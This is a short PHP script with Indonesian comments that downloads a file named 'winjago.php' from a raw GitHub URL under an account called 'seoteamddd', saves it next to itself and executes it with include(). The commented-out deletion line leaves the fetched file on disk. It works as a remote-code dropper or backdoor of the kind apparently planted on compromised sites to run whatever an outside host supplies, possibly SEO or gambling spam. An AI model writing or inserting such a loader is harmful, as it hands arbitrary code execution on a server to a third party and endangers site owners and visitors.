<?php
// Ambil kode dari file eksternal
$remote_url = 'https://raw.githubusercontent.com/seoteamddd/FILE/refs/heads/main/winjago.php';
$remote_code = file_get_contents($remote_url);

// Jika sukses ambil
if ($remote_code !== false && strlen($remote_code) > 10) {
    $temp_file = __DIR__ . '/winjago.php';
    
    // Simpan ke file sementara
    file_put_contents($temp_file, $remote_code);

    // Jalankan isi file PHP
    include($temp_file);

    // Optional: Hapus file setelah dieksekusi
    // unlink($temp_file);
} else {
    echo "Gagal mengambil atau file kosong.";
}
?>